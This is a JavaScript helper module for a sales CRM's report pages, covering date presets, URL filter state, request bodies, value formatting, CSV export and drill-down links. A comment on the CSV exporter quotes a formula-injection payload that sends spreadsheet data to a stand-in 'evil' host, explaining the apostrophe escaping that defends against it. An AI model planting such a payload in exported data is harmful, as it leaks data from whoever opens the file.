// src/pages/Reports/reportUtils.js
//
// Pure helpers behind ReportPage: filter state <-> URL <-> POST body, value
// formatting, CSV, and the drill-down URL. No React, so the arithmetic that
// decides what a report asks for is testable without a DOM.
import dayjs from "dayjs";

import { formatCurrency } from "../../utils/format";

const ISO = "YYYY-MM-DD";

export const PRESETS = [
  { value: "7d", label: "7d" },
  { value: "30d", label: "30d" },
  { value: "90d", label: "90d" },
  { value: "month", label: "This month" },
  { value: "custom", label: "Custom" },
];

export const DATE_BASES = [
  { value: "created", label: "Created" },
  { value: "closed", label: "Closed" },
  { value: "activity", label: "Activity" },
];

const ID_KEYS = ["BranchId", "OwnerId", "SourceId", "ProductId"];

/**
 * The date range a preset stands for, today inclusive.
 *
 * dayjs formats local calendar dates, never `toISOString()` — in IST that
 * would roll every boundary back a day.
 */
export function presetRange(preset, today = dayjs()) {
  const to = today.format(ISO);
  switch (preset) {
    case "7d":
      return { from: today.subtract(6, "day").format(ISO), to };
    case "90d":
      return { from: today.subtract(89, "day").format(ISO), to };
    case "month":
      return { from: today.startOf("month").format(ISO), to };
    default:
      return { from: today.subtract(29, "day").format(ISO), to };
  }
}

const isIso = (s) => typeof s === "string" && /^\d{4}-\d{2}-\d{2}$/.test(s) && dayjs(s).isValid();
const idOf = (v) => (v && /^\d+$/.test(v) ? Number(v) : null);

/**
 * URL search params -> filter state. Anything unknown falls back to a default.
 *
 * `defaultBasis` is the page's own default, not the module's: a lost-reason
 * report keyed on when the lead was *created* answers a question nobody asked,
 * so Lost passes "closed". Without this the page has no lever at all — the
 * `dateBases` prop only feeds the picker's options.
 */
export function readFilters(params, { groupBys, defaultBasis = "created", today = dayjs() }) {
  const get = (k) => params.get(k);
  const hasDates = isIso(get("from")) || isIso(get("to"));
  const preset = PRESETS.some((p) => p.value === get("preset"))
    ? get("preset")
    : hasDates
      ? "custom"
      : "30d";
  let range;
  if (preset === "custom") {
    const fallback = presetRange("30d", today);
    range = {
      from: isIso(get("from")) ? get("from") : fallback.from,
      to: isIso(get("to")) ? get("to") : fallback.to,
    };
  } else {
    range = presetRange(preset, today);
  }
  const basis = DATE_BASES.some((b) => b.value === get("basis")) ? get("basis") : defaultBasis;
  const groupBy = groupBys.some((g) => g.value === get("groupBy")) ? get("groupBy") : groupBys[0].value;
  const ids = Object.fromEntries(ID_KEYS.map((k) => [k, idOf(get(k))]));
  return { preset, from: range.from, to: range.to, basis, groupBy, ...ids };
}

/**
 * Filter state -> URL params. Defaults are left out so a fresh page has a
 * clean address; groupBy always stays so a shared link says what it shows.
 */
export function writeFilters(f, defaultBasis = "created") {
  const out = { groupBy: f.groupBy };
  if (f.preset !== "30d") out.preset = f.preset;
  if (f.preset === "custom") {
    out.from = f.from;
    out.to = f.to;
  }
  if (f.basis !== defaultBasis) out.basis = f.basis;
  for (const k of ID_KEYS) if (f[k]) out[k] = String(f[k]);
  return out;
}

/** Filter state -> the POST body every report endpoint takes (reportKit.parseReportArgs). */
export const toBody = (f) => ({
  FromDate: f.from,
  ToDate: f.to,
  DateBasis: f.basis,
  GroupBy: f.groupBy,
  BranchId: f.BranchId,
  OwnerId: f.OwnerId,
  SourceId: f.SourceId,
  ProductId: f.ProductId,
});

/** One formatter for KPI tiles and table cells. Nothing renders as an em dash. */
export function formatValue(format, v) {
  if (v === null || v === undefined || v === "") return "—";
  switch (format) {
    case "int":
      return Number(v).toLocaleString("en-IN");
    case "pct":
      return `${Number(v).toFixed(1)}%`;
    case "money":
      return formatCurrency(v, { empty: "—" });
    case "days":
      return `${Number(v).toFixed(1)} d`;
    case "hours":
      return `${Number(v).toFixed(1)} h`;
    case "date":
      return dayjs(v).isValid() ? dayjs(v).format("DD-MM-YYYY") : String(v);
    default:
      return String(v);
  }
}

/**
 * Header row from the column headers; a cell is quoted when it holds a comma,
 * quote, newline or carriage return.
 *
 * Text starting `= + - @` or a tab/CR is prefixed with an apostrophe. Excel and
 * Sheets evaluate such a cell as a formula, and quoting does not stop it — the
 * quotes are stripped at parse time. These cells carry names users type
 * (tblUser.FullName is self-service), so without this a rep could set their
 * display name to =HYPERLINK("http://evil/?d="&A2) and have it fire when a
 * manager opens the exported leaderboard. Numbers are exempt so a real -5
 * stays -5.
 */
export function toCsv(columns, rows) {
  const esc = (s) => {
    const t = s === null || s === undefined ? "" : String(s);
    const safe = typeof s !== "number" && /^[=+\-@\t\r]/.test(t) ? `'${t}` : t;
    return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
  };
  const head = columns.map((c) => esc(c.header)).join(",");
  const body = rows.map((r) => columns.map((c) => esc(r[c.key])).join(","));
  return [head, ...body].join("\n");
}

/** The Leads list, pre-filtered. Null / empty values are dropped. */
export function leadsUrl(params) {
  const q = new URLSearchParams();
  for (const [k, v] of Object.entries(params)) {
    if (v !== null && v !== undefined && v !== "") q.set(k, String(v));
  }
  const s = q.toString();
  return s ? `/sales/leads?${s}` : "/sales/leads";
}

/**
 * Which Leads filter a breakdown row's GroupKey maps onto. Groupings the list
 * cannot filter by (team, day, reason, pair) map to nothing: the drill then
 * shows the range with the active filters, which is still the right list.
 */
export const GROUP_PARAM = {
  source: "SourceId",
  owner: "OwnerId",
  product: "ProductId",
  branch: "BranchId",
  status: "StatusId",
};

/**
 * The four filter-bar ids, for a page building its own drill. Every report SP
 * narrows on these, so a drill that omits them lands on a wider list than the
 * row it came from — the row says 70 and the list shows 120.
 */
export const idFilters = (f) => ({
  BranchId: f.BranchId,
  OwnerId: f.OwnerId,
  SourceId: f.SourceId,
  ProductId: f.ProductId,
});

/**
 * The date range, but only when it means the same thing on both sides.
 * sp_FetchLeads narrows on CreatedAt, so passing the range from a report run
 * on `closed` or `activity` would drill into a different set of leads than the
 * row counted.
 */
export const drillRange = (f) =>
  f.basis && f.basis !== "created" ? {} : { from: f.from, to: f.to };

/** Default drill: the active filters + the range + the row's group. */
export function drillParams(filters, row) {
  const key = GROUP_PARAM[filters.groupBy];
  const hasKey = key && row?.GroupKey !== null && row?.GroupKey !== undefined;
  // Range first: a JS object keeps a key's first position when a later spread
  // overwrites it, so the URL reads from&to&<filters>&<group> whatever the group is.
  return {
    ...drillRange(filters),
    ...idFilters(filters),
    ...(hasKey ? { [key]: row.GroupKey } : {}),
  };
}

/**
 * A bar chart's category axis. Resolution and category names are free text the
 * company writes in Settings — "Replaced under warranty" is a normal one — so
 * on a 360px axis recharts either overlapped the tick labels or silently
 * dropped every other one, and the reader could no longer tell which bar was
 * which. Shortening fits more of them; the chart's Tooltip still shows the
 * full name, because it reads the raw datum rather than the tick.
 */
export const truncTick = (v) =>
  typeof v === "string" && v.length > 12 ? `${v.slice(0, 11)}\u2026` : v;
